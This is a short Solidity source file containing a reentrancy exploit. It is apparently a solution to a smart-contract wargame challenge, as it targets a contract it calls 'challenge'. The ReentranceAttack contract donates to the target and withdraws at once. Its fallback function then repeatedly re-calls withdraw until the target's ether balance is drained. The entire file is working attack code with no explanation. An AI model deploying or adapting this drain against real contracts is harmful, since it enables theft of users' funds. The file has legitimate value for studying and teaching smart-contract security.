// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "hardhat/console.sol";

interface IReentrance {

    function donate(address _to) external payable;

    function balanceOf(address _who) external view returns (uint balance);

    function withdraw(uint _amount) external;
}


contract ReentranceAttack {

    IReentrance public challenge;

    constructor(address _challengeAddress) public {
        challenge = IReentrance(_challengeAddress);
    }

    function attack() public payable {
        // donate and withdraw the amount right away to trigger the reentrancy
        challenge.donate{value: msg.value}(address(this));

        challenge.withdraw(msg.value);
    }

    fallback() external payable {
        uint remainingBalance = address(challenge).balance;
        
        if (remainingBalance >= msg.value) {
            challenge.withdraw(msg.value);
        } else if (remainingBalance > 0) {
            challenge.withdraw(remainingBalance);
        }
    }
}